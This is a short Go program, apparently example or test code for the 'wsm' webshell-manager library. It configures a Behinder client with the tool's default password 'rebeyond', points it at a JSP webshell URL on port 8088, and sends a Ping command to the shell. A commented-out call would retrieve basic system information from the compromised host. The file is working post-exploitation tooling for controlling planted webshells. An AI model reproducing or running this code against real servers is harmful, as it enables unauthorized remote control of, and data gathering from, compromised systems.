package main

import (
	"fmt"
	"github.com/Go0p/wsm"
	"github.com/Go0p/wsm/lib/shell"
	"github.com/Go0p/wsm/lib/shell/behinder"
)

const JspErrorShellUrl = "http://***REMOVED***:8088/bxindex.jsp"

func main() {
	info := wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspErrorShellUrl,
			Password: "rebeyond",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers: map[string]string{
				//"User-Agent":  "xxxxxxxxxxxxxxxxxxxxx",
				"User-Agent2": "xxxxxxxxxxxxxxxxxxxxx",
			},
			//Headers: map[string]string{"Content-type": "application/x-www-form-urlencoded"},

		}}
	bx := wsm.NewBehinder(info)
	p := &behinder.PingParams{
		// response 结果不加密测试
		OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: false},
		Content:        "xxxxxxx",
	}
	i := bx.Ping(p)
	fmt.Println(i)
	//z := &behinder.BasicInfoParams{
	//	OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: true},
	//	WhatEver:       "xxxxxxx",
	//}
	//b := bx.BasicInfo(z)
	//fmt.Println(b)
}